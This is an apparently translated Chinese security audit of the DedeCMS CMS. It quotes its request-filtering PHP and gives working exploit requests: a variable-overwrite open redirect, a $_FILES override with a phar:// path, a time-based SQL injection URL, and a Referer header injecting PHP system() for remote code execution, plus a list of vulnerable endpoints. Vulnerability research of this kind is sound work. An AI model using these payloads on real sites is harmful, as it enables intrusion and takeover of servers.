# Dedecms审计

前言: 很明显这是一篇翻译文章

## 0x01 输入是怎么被处理的

```php
function _RunMagicQuotes(&$svar)
{
    if (!@get_magic_quotes_gpc()) {
        if (is_array($svar)) {
            foreach ($svar as $_k => $_v) {
                $svar[$_k] = _RunMagicQuotes($_v);
            }

        } else {
            if (strlen($svar) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $svar)) {
                exit('Request var not allow!');
            }
            $svar = addslashes($svar);
        }
    }
    return $svar;
}

if (!defined('DEDEREQUEST')) {
    //检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)
    function CheckRequest(&$val)
    {
        if (is_array($val)) {
            foreach ($val as $_k => $_v) {
                if ($_k == 'nvarname') {
                    continue;
                }

                CheckRequest($_k);
                CheckRequest($val[$_k]);
            }
        } else {
            if (strlen($val) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)) {
                exit('Request var not allow!');
            }
        }
    }

    //var_dump($_REQUEST);exit;
    CheckRequest($_REQUEST);
    CheckRequest($_COOKIE);

    foreach (array('_GET', '_POST', '_COOKIE') as $_request) {
        foreach ($$_request as $_k => $_v) {
            if ($_k == 'nvarname') {
                ${$_k} = $_v;
            } else {
                ${$_k} = _RunMagicQuotes($_v);
            }

        }
    }
}
```

```php
if (!defined('DEDEREQUEST')) {
    //检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)
    function CheckRequest(&$val)
    {
        if (is_array($val)) {
            foreach ($val as $_k => $_v) {
                if ($_k == 'nvarname') {
                    continue;
                }

                CheckRequest($_k);
                CheckRequest($val[$_k]);
            }
        } else {
            if (strlen($val) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)) {
                exit('Request var not allow!');
            }
        }
    }

    //var_dump($_REQUEST);exit;
    CheckRequest($_REQUEST);
    CheckRequest($_COOKIE);

    foreach (array('_GET', '_POST', '_COOKIE') as $_request) {
        foreach ($$_request as $_k => $_v) {
            if ($_k == 'nvarname') {
                ${$_k} = $_v;
            } else {
                ${$_k} = _RunMagicQuotes($_v);
            }

        }
    }
}
```

我们可以看见一个经典漏洞就是`变量覆盖`

```
dede/co_url.php?_SERVER[SERVER_SOFTWARE]=PHP%201%20Development%20Server&_SERVER[SCRIPT_NAME]=www.baidu.com
```

![image-20211002054740846](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002054740846.png)

```
攻击者可以利用 Open redirect 漏洞诱骗用户访问某个可信赖站点的 URL，并将他们重定向到恶意站点。攻击者通过对 URL 进行编码，使最终用户很难注意到重定向的恶意目标，即使将这一目标作为 URL 参数传递给可信赖的站点时也会发生这种情况
```

再加上

```
plus/recommend.php?_FILES[poc][name]=0&_FILES[poc][type]=1337&_FILES[poc][tmp_name]=phar:///path/to/uploaded/phar.rce&_FILES[poc][size]=
```

![image-20211002060938290](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002060938290.png)

![image-20211002060951937](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002060951937.png)

这不是堪称完美。

这里是 先对$_FILES进行一次迭代$_FILE[1]，然后$_FILES[A][2]感觉

后面的代码就很正常了。**感觉这里可以原地造一个题出来。**

## 0x02 sql注入

![image-20211002101414424](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002101414424.png)

我们可以看到这是唯一的sql注入的过滤函数。

![image-20211002101443364](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002101443364.png)

看到被使用的地方不多，我们可以通过找到，执行`mysqli_query`但是没有执行该函数的地方。

```
ExecuteSafeQuery
IsTable
GetVersion
GetTableFields
```

```
GetTableFields
```

发现下面这个是最好的利用点。

```
/dede/sys_data_done.php?dopost=bak&tablearr=1&nowtable=%23@__vote+where+1=sleep(5)--+& HTTP/1.1
```

## 0x03 ShowMsg RCE

![image-20211002104807891](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002104807891.png)

![image-20211002104818885](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002104818885.png)

![image-20211002104910416](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002104910416.png)

![image-20211002105258814](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002105258814.png)

![image-20211002105410762](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211002105410762.png)

这个变量来自于FERER但是可以被加载的模板文件中，最后被php解析，这是一个，我们就可以对它进行构造

```
GET /plus/flink.php?dopost=save&c=id HTTP/1.1
Host: target
Referer: <?php "system"($c);die;/*
```

其他利用路劲

```
/plus/flink.php?dopost=save
/plus/users_products.php?oid=1337
/plus/download.php?aid=1337
/plus/showphoto.php?aid=1337
/plus/users-do.php?fmdo=sendMail
/plus/posttocar.php?id=1337
/plus/vote.php?dopost=view
/plus/carbuyaction.php?do=clickout
/plus/recommend.php
```

最后的修复是直接

`echo $msg`

